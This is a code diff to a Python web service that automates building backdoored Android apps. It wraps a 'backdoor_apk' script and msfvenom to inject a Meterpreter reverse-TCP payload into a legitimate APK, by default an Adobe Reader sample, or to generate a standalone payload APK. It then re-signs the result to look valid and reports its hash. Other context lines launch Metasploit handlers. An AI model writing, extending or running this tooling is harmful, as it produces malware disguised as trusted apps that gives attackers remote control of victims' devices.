@@ -10,6 +10,8 @@ from typing import Dict, List, Optional
 
 from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
+from hashlib import sha256
+import json
 
 WORKSPACE = Path("/workspace")
 TASKS_ROOT = WORKSPACE / "tasks"
@@ -150,68 +152,173 @@ exploit -j -z
     _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfconsole rc={rc}")
 
 
+def _file_exists(path: Path) -> bool:
+    try:
+        return path.exists() and path.is_file()
+    except Exception:
+        return False
+
+
+def _unzip_list(path: Path) -> str:
+    try:
+        out = subprocess.check_output(["unzip", "-l", str(path)], text=True, stderr=subprocess.STDOUT)
+        return out
+    except Exception as e:
+        return f"unzip failed: {e}"
+
+
+def _aapt_badging(path: Path) -> str:
+    aapt = WORKSPACE / "tools/android-sdk/aapt"
+    if not aapt.exists():
+        return "aapt not found"
+    try:
+        out = subprocess.check_output([str(aapt), "dump", "badging", str(path)], text=True, stderr=subprocess.STDOUT)
+        return out
+    except Exception as e:
+        return f"aapt failed: {e}"
+
+
+def _jarsigner_verify(path: Path) -> str:
+    jarsigner = shutil.which("jarsigner") or "/usr/bin/jarsigner"
+    try:
+        out = subprocess.check_output([jarsigner, "-verify", "-certs", str(path)], text=True, stderr=subprocess.STDOUT)
+        return out
+    except subprocess.CalledProcessError as e:
+        return e.output if isinstance(e.output, str) else str(e)
+    except Exception as e:
+        return f"verify failed: {e}"
+
+
+def _write_json(path: Path, data: dict) -> None:
+    _ensure_dir(path.parent)
+    path.write_text(json.dumps(data, indent=2))
+
+
 def run_android_task(task_id: str, base: Path, params: Dict[str, str]):
     t = tasks[task_id]
     with locks[task_id]:
         t.state = TaskStatus.PREPARING
-    # write config files expected by backdoor_apk
-    config_path = WORKSPACE / "config" / "config.path"
-    _ensure_dir(config_path.parent)
-    config_lines = [
-        "",  #1
-        "",  #2
-        "",  #3
-        "unzip",  #4
-        "/usr/bin/jarsigner",  #5
-        "unzip",  #6
-        "/usr/bin/keytool",  #7
-        str(WORKSPACE / "tools/android-sdk/zipalign"),  #8
-        str(WORKSPACE / "tools/android-sdk/dx"),  #9
-        str(WORKSPACE / "tools/android-sdk/aapt"),  #10
-        str(WORKSPACE / "tools/apktool/apktool"),  #11
-        str(WORKSPACE / "tools/baksmali233/baksmali"),  #12
-        "/usr/bin/msfconsole",  #13
-        "/usr/bin/msfvenom",  #14
-        str(WORKSPACE / "backdoor_apk"),  #15
-        "searchsploit",  #16
-        str(base / "output"),  #17
-    ]
-    _write_file(config_path, "\n".join(config_lines) + "\n")
-    apk_tmp = WORKSPACE / "config" / "apk.tmp"
-    # always ensure an original apk exists in task input
-    sample = WORKSPACE / "APKS/armeabi-v7a/AdobeReader.apk"
-    dst_apk = base / "input" / "original.apk"
-    if params.get("apk_path") and Path(params["apk_path"]).exists():
-        shutil.copy2(params["apk_path"], dst_apk)
-    elif sample.exists():
-        shutil.copy2(sample, dst_apk)
-    else:
-        _write_file(build_log := base / "logs" / "build.log", "Sample APK not found and no apk_path provided\n")
-        _finalize_task(t, base, succeeded=False, err="missing original apk")
-        return
-    _write_file(apk_tmp, "\n".join([
-        str(dst_apk),
-        str(base / "output" / "app_backdoor.apk"),
-        params.get("payload", "android/meterpreter/reverse_tcp"),
-        params.get("lhost", "127.0.0.1"),
-        params.get("lport", "4444"),
-    ]) + "\n")
+    # config
+    mode = params.get("mode", "backdoor_apk")  # backdoor_apk | standalone
+    perm_strategy = params.get("perm_strategy", "keep")  # keep | merge
+    payload = params.get("payload", "android/meterpreter/reverse_tcp")
+    lhost = params.get("lhost", "127.0.0.1")
+    lport = params.get("lport", "4444")
+    output_apk = base / "output" / (params.get("output_name", "app_backdoor") + ".apk")
+    # signing params
+    keystore = params.get("keystore_path")
+    key_alias = params.get("key_alias")
+    ks_pass = params.get("keystore_password")
+    key_pass = params.get("key_password", ks_pass)
+
     build_log = base / "logs" / "build.log"
-    # non-interactive select option 1 (Keep original permissions)
-    cmd = ["bash", str(WORKSPACE / "backdoor_apk")]
     with locks[task_id]:
         t.state = TaskStatus.RUNNING
         t.started_at = time.time()
         t.logs["build"] = str(build_log)
-    with build_log.open("w") as lf:
-        proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=lf, stderr=subprocess.STDOUT)
+
+    succeed = False
+    err = None
+
+    if mode == "standalone":
+        # Generate standalone APK via msfvenom
+        cmd = [
+            "msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
+            "-o", str(output_apk)
+        ]
+        rc = _spawn(cmd, build_log)
+        if rc != 0:
+            err = f"msfvenom standalone rc={rc}"
+        else:
+            succeed = _file_exists(output_apk)
+    else:
+        # backdoor_apk mode (default)
+        # write config files expected by backdoor_apk
+        config_path = WORKSPACE / "config" / "config.path"
+        _ensure_dir(config_path.parent)
+        config_lines = [
+            "", "", "", "unzip", "/usr/bin/jarsigner", "unzip", "/usr/bin/keytool",
+            str(WORKSPACE / "tools/android-sdk/zipalign"), str(WORKSPACE / "tools/android-sdk/dx"),
+            str(WORKSPACE / "tools/android-sdk/aapt"), str(WORKSPACE / "tools/apktool/apktool"),
+            str(WORKSPACE / "tools/baksmali233/baksmali"), "/usr/bin/msfconsole", "/usr/bin/msfvenom",
+            str(WORKSPACE / "backdoor_apk"), "searchsploit", str(base / "output"),
+        ]
+        _write_file(config_path, "\n".join(config_lines) + "\n")
+        # ensure input apk in task folder
+        sample = WORKSPACE / "APKS/armeabi-v7a/AdobeReader.apk"
+        dst_apk = base / "input" / "original.apk"
+        if params.get("apk_path") and Path(params["apk_path"]).exists():
+            shutil.copy2(params["apk_path"], dst_apk)
+        else:
+            shutil.copy2(sample, dst_apk)
+        # write apk.tmp for the script
+        apk_tmp = WORKSPACE / "config" / "apk.tmp"
+        _write_file(apk_tmp, "\n".join([
+            str(dst_apk),
+            str(output_apk),
+            payload,
+            lhost,
+            lport,
+        ]) + "\n")
+        # run script and choose permissions
+        choice = b"1\n" if perm_strategy == "keep" else b"2\n"
+        with build_log.open("w") as lf:
+            proc = subprocess.Popen(["bash", str(WORKSPACE / "backdoor_apk")], stdin=subprocess.PIPE, stdout=lf, stderr=subprocess.STDOUT)
+            try:
+                proc.stdin.write(choice)
+                proc.stdin.flush()
+            except Exception:
+                pass
+            rc = proc.wait()
+        succeed = _file_exists(output_apk)
+        if not succeed:
+            err = f"backdoor_apk rc={rc}"
+
+    # optional re-sign if keystore provided and artifact exists
+    if succeed and keystore and Path(keystore).exists():
         try:
-            proc.stdin.write(b"1\n")
-            proc.stdin.flush()
+            unsigned = output_apk
+            # align to temp
+            aligned = base / "temp" / "aligned.apk"
+            _ensure_dir(aligned.parent)
+            zipalign = str(WORKSPACE / "tools/android-sdk/zipalign")
+            subprocess.check_call([zipalign, "4", str(unsigned), str(aligned)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
+            # sign
+            jarsigner = shutil.which("jarsigner") or "/usr/bin/jarsigner"
+            sign_cmd = [jarsigner, "-sigalg", "SHA256withRSA", "-digestalg", "SHA-256",
+                        "-keystore", keystore, "-storepass", ks_pass or "", "-keypass", key_pass or "",
+                        str(aligned), key_alias or "signing.key"]
+            subprocess.check_call(sign_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
+            # verify
+            _ = _jarsigner_verify(aligned)
+            # replace output
+            shutil.move(str(aligned), str(output_apk))
+        except Exception as e:
+            # keep original but report signing failure
+            err = (err or "") + f"; resign failed: {e}"
+
+    # validations and report
+    report = {
+        "mode": mode,
+        "payload": payload,
+        "lhost": lhost,
+        "lport": lport,
+        "artifact": str(output_apk) if _file_exists(output_apk) else None,
+        "precheck": {},
+        "postcheck": {}
+    }
+    if _file_exists(output_apk):
+        try:
+            with open(output_apk, 'rb') as f:
+                report["sha256"] = sha256(f.read()).hexdigest()
         except Exception:
-            pass
-        rc = proc.wait()
-    _finalize_task(t, base, succeeded=(rc == 0 or (base / "output" / "app_backdoor.apk").exists()), err=None if (base / "output" / "app_backdoor.apk").exists() else f"backdoor_apk rc={rc}")
+            report["sha256"] = None
+        report["postcheck"]["unzip_list"] = _unzip_list(output_apk)
+        report["postcheck"]["aapt_badging"] = _aapt_badging(output_apk)
+        report["postcheck"]["jarsigner_verify"] = _jarsigner_verify(output_apk)
+        _write_json(base / "output" / "report.json", report)
+
+    _finalize_task(t, base, succeeded=succeed, err=err)
 
 
 def run_winexe_task(task_id: str, base: Path, params: Dict[str, str]):
